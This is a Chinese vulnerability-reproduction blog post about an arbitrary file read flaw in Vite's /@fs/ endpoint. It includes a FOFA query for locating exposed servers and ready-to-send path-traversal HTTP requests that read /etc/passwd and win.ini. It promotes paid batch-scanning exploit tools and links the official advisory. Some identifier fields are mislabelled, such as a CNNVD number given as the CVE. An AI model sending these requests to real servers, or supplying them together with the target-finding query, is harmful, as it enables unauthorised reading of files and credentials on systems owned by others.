#  Vite vite-project接口存在任意文件读取漏洞CNNVD-202504-684 附POC   
2025-4-10更新  南风漏洞复现文库   2025-04-10 23:27  
  
   
  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. Vite 简介  
  
微信公众号搜索：南风漏洞复现文库  
  
该文章 南风漏洞复现文库 公众号首发  
  
Vite框架  
## 2.漏洞描述  
  
Vite是Vite开源的一种新型的前端构建工具。Vite vite-project接口存在任意文件读取漏洞。  
  
CVE编号:CNNVD-202504-684  
  
CNNVD编号:CNNVD-202503-2801  
  
CNVD编号:  
## 3.影响版本  
  
Vite框架  
  
![Vite vite-project接口存在任意文件读取漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3YzicuY7icMgJr7rChLOozgKFkTtJVthoufUj8bpPicZjjdNIh6ciamSHkZRBZTkJdR2WsVuSXIbr7Zlw/640?wx_fmt=png&from=appmsg "null")  
  
Vite vite-project接口存在任意文件读取漏洞  
## 4.fofa查询语句  
  
body="/@vite/client"  
## 5.漏洞复现  
  
漏洞链接：https://xx.xx.xx.xx/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&?inline=1.wasm?init  
  
漏洞数据包：  
  
linux下：  
```
GET /@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&?inline=1.wasm?init HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YzicuY7icMgJr7rChLOozgKFX93PqZkMELlmMNFtoKdx5QXVDlA5MLl52owpS3A1zzwwpjs0TibNCtQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
window下：  
```
GET /@fs/x/x/x/vite-project/?/../../../../../C://windows/win.ini?import&?inline=1.wasm?init HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*Connection: Keep-Alive
```  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
  
  
2: 免登录，免费fofa查询。  
  
  
3: 更新其他实用网络安全工具项目。  
  
  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YzicuY7icMgJr7rChLOozgKFZibkl9HMHxW2xDcJE76rGO2DD4FuEBresTtyBhFr4HKibOW9mZYCiaXtw/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YzicuY7icMgJr7rChLOozgKFPe9AYKAVMbic0Ea5FP5s6WxBjtTtFRhuteyUL3TmS3aT9PXb4v8okMw/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YzicuY7icMgJr7rChLOozgKFPhnX44uplFRfX0aSGgiavvRzIoJxrrRMtbnQwkFsNibh6Gu0vthiam4CA/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YzicuY7icMgJr7rChLOozgKFibfyGxEmc3RMhSM0Fnqeslsicwlqydf3VD6VaEYoEawPmIlRp2oXePAg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YzicuY7icMgJr7rChLOozgKFqtUkTIibIuodGZXoUXLkVWar24PnhBT5icibKmCn831enlylYmla6aiacg/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
官方补丁：hhttps://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x  
## 8.往期回顾  
  
  
   
  
  
  
